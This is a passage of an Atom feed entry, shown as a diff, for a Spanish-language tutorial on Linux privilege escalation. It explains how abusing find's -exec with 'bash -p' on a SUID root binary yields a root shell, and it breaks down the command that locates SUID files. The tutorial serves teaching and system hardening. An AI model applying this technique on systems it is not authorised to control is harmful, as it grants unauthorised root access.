+  &lt;li&gt;También tiene el permiso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suid&lt;/code&gt; agregado, lo que significa que podemos ejecutar el programa/comando como su propietario.&lt;/li&gt;
+  &lt;li&gt;Viendo quien es el propietario de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; nos damos cuenta de que es  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; tiene el  parámetro  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; que te permite convertirte en el usuario propietario de su binario por si tiene el permiso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suid&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Sabiendo esto podemos llegar a la conclusión que debemos abusar del parámetro  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-exec&lt;/code&gt; y ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -p&lt;/code&gt; para convertirnos en su propietario, en este caso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;buscar-ficheros-que-tengan-el-permiso-suid&quot;&gt;Buscar ficheros que tengan el permiso SUID&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Parámetro&lt;/th&gt;
+      &lt;th&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;find&lt;/td&gt;
+      &lt;td&gt;buscar archivos en una jerarquía de directorios&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;/&lt;/td&gt;
+      &lt;td&gt;desde que directorio empezar a buscar&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;-perm -4000&lt;/td&gt;
+      &lt;td&gt;especificamos que queremos buscar ficheros que contengan los permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4000&lt;/code&gt; o SUID&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;-ls&lt;/td&gt;
+      &lt;td&gt;seria como ejecutar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l&lt;/code&gt; en cada fichero de salida&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;2&amp;gt;/dev/null&lt;/td&gt;
+      &lt;td&gt;que dirija todos los errores al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/null&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;</content><author><name>Jose Salinas</name></author><category term="PrivEsc" /><category term="linux" /><category term="privesc" /><category term="suid" /><summary type="html">Hay veces que es necesario que un programa se ejecute con los privilegios de su propietario en lugar de con los privilegios del usuario que lo ejecuta.</summary></entry></feed>
